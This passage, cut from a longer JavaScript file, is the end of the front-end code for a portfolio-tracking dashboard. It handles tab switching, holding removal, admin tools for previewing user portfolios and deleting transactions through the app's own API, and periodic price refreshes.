      document.querySelectorAll('.tx-tab-content').forEach(tab => tab.classList.remove('active'))
      e.target.classList.add('active')
      const tabId = e.target.getAttribute('data-tab')
      const tabEl = $id(tabId)
      if(tabEl) tabEl.classList.add('active')
    })
  })

  sortSelect && sortSelect.addEventListener('change', render)
  filterSelect && filterSelect.addEventListener('change', render)

  document.addEventListener('click', (ev) => {
    const rm = ev.target.closest('.btn-remove')
    if (rm) {
      const symbol = rm.getAttribute('data-symbol')
      holdings = holdings.filter(h => h.symbol !== symbol)
      refreshPrices().then(render)
    }

    // admin table actions
    const loadBtn = ev.target.closest('.admin-load')
    if (loadBtn) {
      const uid = loadBtn.getAttribute('data-id')
      if (uid) {
        if (adminUserSelect) adminUserSelect.value = uid
        loadUserPortfolio()
      }
    }

    const previewBtn = ev.target.closest('.admin-preview')
    if (previewBtn) {
      const uid = previewBtn.getAttribute('data-id')
      if (uid) loadUserPreview(uid)
    }

    // Transaction edit/delete buttons
    const txEditBtn = ev.target.closest('.btn-edit')
    if (txEditBtn) {
      const txId = txEditBtn.getAttribute('data-tx-id')
      if (txId !== null) openTxForm(txId)
    }

    const txDelBtn = ev.target.closest('[data-tx-id]')
    if (txDelBtn && txDelBtn.classList.contains('btn-remove')) {
      const txId = txDelBtn.getAttribute('data-tx-id')
      if (txId !== null && confirm('Delete this transaction?')) {
        const key = getAdminKey()
        if (!key) return showMessage('Admin key required', 'error')
        fetch(`${apiBase}/admin/pro/transactions/${txId}`, {
          method: 'DELETE',
          headers: {'x-admin-key': key}
        })
          .then(r => r.ok ? Promise.resolve() : Promise.reject())
          .then(() => { showMessage('Transaction deleted', 'success'); fetchTransactions() })
          .catch(() => showMessage('Unable to delete transaction', 'error'))
      }
    }
  })

  // Init - Run immediately since DOM is already loaded
  function initApp() {
    buildSymbolOptions()
    // restore admin key and fetch users if present
    if(adminKeyEl){
      const k = sessionStorage.getItem('adminKey')
      if(k) adminKeyEl.value = k
      fetchUsers()
      fetchTransactions()
      // Don't call fetchTestimonies on init - only if admin section is enabled
    }
    if(adminPreviewText) adminPreviewText.textContent = 'Ready to manage'
    refreshPrices().then(render)
  }

  // Check if DOM is already loaded
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp)
  } else {
    initApp()
  }

  // admin main UI events
  adminRefreshUsersBtn && adminRefreshUsersBtn.addEventListener('click', ()=>{ fetchUsers() })
  previewLoadIntoMainBtn && previewLoadIntoMainBtn.addEventListener('click', ()=>{
    const uid = adminUserPreview && adminUserPreview.dataset && adminUserPreview.dataset.uid
    if(uid){
      if(adminUserSelect) adminUserSelect.value = uid
      loadUserPortfolio()
    }
  })
  previewOpenModalBtn && previewOpenModalBtn.addEventListener('click', ()=>{
    const uid = adminUserPreview && adminUserPreview.dataset && adminUserPreview.dataset.uid
    if(uid){
      if(adminUserSelect) adminUserSelect.value = uid
      openModal()
    }
  })

  // Auto-refresh every 30 seconds
  setInterval(() => {
    refreshPrices().then(render)
  }, 30000)

  // Expose for debug
  window.PRO_ADMIN = {holdings, refreshPrices, render, addHolding}
})();
